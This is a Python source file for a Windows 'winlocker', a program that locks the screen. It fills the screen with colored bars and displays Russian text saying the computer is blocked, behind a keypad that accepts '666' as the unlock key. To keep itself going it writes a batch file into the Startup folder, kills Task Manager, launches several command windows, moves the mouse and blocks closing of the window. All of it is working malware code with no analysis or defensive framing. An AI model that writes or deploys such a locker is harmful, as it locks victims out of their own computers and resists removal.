from tkinter import *
import random,pyautogui,os,subprocess,getpass
import tkinter.messagebox as message
from win32api import GetSystemMetrics
from win32com.shell import shell, shellcon
from time import sleep
import zipfile, sys,glob,keyboard   
import psutil

def CMD_BOMB():
  Started = [os.system('start cmd.exe') for RanDom in range(random.randint(3,7))]

def Generator_Key():
      Password = [random.randint(0,9) for j in range(8)]
      print((''.join(map(str,Password))))

def Blocker_Ctrl_alt_del():
        for proc in psutil.process_iter():
           if proc.name().lower() == 'taskmgr.exe':
               proc.terminate()

def Name_Files():
    Name_File = 'инструкция.txt'
    mess = 'Ваш текст'
    Info_Unlock(Name_File, mess)

def Info_Unlock(Name_File, mess):
    f = open(Name_File,'w+')  
    
    if f.readlines() != mess:
       f.write(mess)
    else:
        pass
    
    f.close()
    os.system(f'start {Name_File}')


def Clicker(buttoner,txt,bttn_list,windowmessage):
        if buttoner in "0123456789":
              txt.insert(END, buttoner)
        elif buttoner == "√":
              Unlocker(txt,windowmessage)
        elif buttoner == "?":
              Name_Files()


def Unlocker(txt,windowmessage):
     global Key
     Key = format(txt.get())
     if Key == '666':
           sys.exit()
     else:
         message.showerror("Неправильный ключ", f"Ключ: {Key} некорректный")
         windowmessage.destroy()
         sleep(0.2)
         MessageBlock(NameUser,HeightScanner)

def MessageBlock(NameUser,HeightScanner):
    Generator_Key()
    
    bttn_list = ["0","1","2","3","4","5","6","7","8","9","?","√"]      

    windowmessage = Tk()
    windowmessage["bg"] = "gray"
    windowmessage.title(f"{NameUser}, прочтите сообщение")  
    windowmessage.geometry(f'{round(HeightScanner/2)}x{round(HeightScanner/2)}')   
    Messag = Label(windowmessage,text=f" {NameUser},\n  ваш компьютер заблокирован",font=("Arial Bold", 20),bg="gray",fg="red2")
    TypeText = StringVar()
    txt = Entry(windowmessage)  
    txt.place(relx = .10, rely = .2, relwidth=.7, relheight=.09)
    Messag.grid()   

    c = 54.8
    r = 160.5
    radiuc = 105.7
    coloR = "lime"
    WidthL = "36.5"
    for i in bttn_list:
        switcher = lambda x=i: Clicker(x,txt,bttn_list,windowmessage)
        btn = Button(windowmessage,text=i, background="black", foreground=coloR,
             padx=WidthL, pady="8", font='Helvetica 12 bold',command=switcher).place(x=c,y=r)   
        c +=radiuc       
        if c > (54.8+(radiuc*3)):
           c = 54.8
           r += 60
        

    BtnCl = Button(windowmessage,text='x',background="black", foreground="red",  padx="4", pady="4", font='Helvetica 12 bold',
    command=(lambda: txt.delete(len(txt.get())-1))).place(x=442,y=110)   

    blockedCloser2(windowmessage)
    windowmessage.mainloop()

    if keyboard.is_pressed('Ctrl+Alt+Del'):
            Blocker_Ctrl_alt_del()
    
        

def AutoRun(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % NameUser
    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
        bat_file.write(r'start "" %s' % file_path)

def blockedCloser():
    pyautogui.moveTo(x=680,y=800)
    root.protocol("WM_DELETE_WINDOW",blockedCloser)
    root.update()

def blockedCloser2(windowmessage):
    pyautogui.moveTo(x=680,y=800)
    windowmessage.protocol("WM_DELETE_WINDOW",blockedCloser)
    windowmessage.update()


print("Width =", GetSystemMetrics(0))
print("Height =", GetSystemMetrics(1))

colors = ['red','orange','yellow','lime','cyan','blue','magenta']

HeightScanner = GetSystemMetrics(1)
      
while HeightScanner % 50 != 0:
      HeightScanner+=1

print(HeightScanner)

root = Tk() 

for xx in range(round(HeightScanner/50)):
    canvas = Canvas(root, height=50, width=GetSystemMetrics(0), bg=random.choice(colors))
    canvas.pack()

NameUser = getpass.getuser()
AutoRun()
Blocker_Ctrl_alt_del()
StFunc = [CMD_BOMB() for xxx in range(random.randint(1,5))]
sleep(0.2)
blockedCloser()
MessageBlock(NameUser,HeightScanner)

root.mainloop()
